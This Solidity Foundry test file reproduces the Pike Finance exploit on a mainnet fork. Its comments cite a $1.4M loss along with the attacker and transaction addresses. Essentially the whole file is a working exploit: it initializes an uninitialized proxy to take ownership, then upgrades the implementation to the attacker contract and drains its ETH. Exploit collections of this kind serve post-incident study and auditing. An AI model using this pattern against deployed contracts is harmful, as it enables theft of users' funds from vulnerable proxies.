// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

import "forge-std/Test.sol";

// @KeyInfo - Total Lost : 1.4M
// Attacker : https://etherscan.io/address/0x19066f7431df29a0910d287c8822936bb7d89e23
// Attack Contract : https://etherscan.io/address/0x1da4bc596bfb1087f2f7999b0340fcba03c47fbd
// Vulnerable Contract : https://etherscan.io/address/0xfc7599cffea9de127a9f9c748ccb451a34d2f063
// Attack Tx : https://etherscan.io/tx/0xe2912b8bf34d561983f2ae95f34e33ecc7792a2905a3e317fcc98052bce66431

// @Info
// Vulnerable Contract Code : https://etherscan.io/address/0xfc7599cffea9de127a9f9c748ccb451a34d2f063#code

// @Analysis
// Post-mortem : 
// Twitter Guy : 
// Hacking God : 

interface IPikeFinanceProxy {
    function initialize(address,address,address,address,uint16,uint16) external;
    function upgradeToAndCall(address,bytes memory) external;
}

contract PikeFinance is Test {
    uint256 blocknumToForkFrom = 19_771_058;
    address constant PikeFinanceProxy = 0xFC7599cfFea9De127a9f9C748CCb451a34d2F063;

    function setUp() public {
        vm.deal(address(this), 0);
        vm.createSelectFork("mainnet", blocknumToForkFrom);
    }

    function testExploit() public {
        emit log_named_decimal_uint(" Attacker ETH Balance Before exploit", address(this).balance, 18);

        // Initialize proxy contract
        address _owner = address(this);
        address _WNativeAddress = address(this);
        address _uniswapHelperAddress = address(this);
        address _tokenAddress = address(this);
        uint16 _swapFee = 20;
        uint16 _withdrawFee = 20;
        IPikeFinanceProxy(PikeFinanceProxy).initialize(_owner, _WNativeAddress, _uniswapHelperAddress, _tokenAddress, _swapFee, _withdrawFee);

        // Upgrade proxy contract
        address newImplementation = address(this);
        bytes memory data = abi.encodeWithSignature("withdraw(address)", address(this));
        IPikeFinanceProxy(PikeFinanceProxy).upgradeToAndCall(newImplementation, data);

        // Log balances after exploit
        emit log_named_decimal_uint(" Attacker ETH Balance After exploit", address(this).balance, 18);
    }

    function withdraw(address addr) external {
        (bool success, ) = payable(addr).call{value: address(this).balance}("");
        require(success, "transfer failed");
    }

    function proxiableUUID() external pure returns(bytes32){
        return 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    receive() external payable {}
}
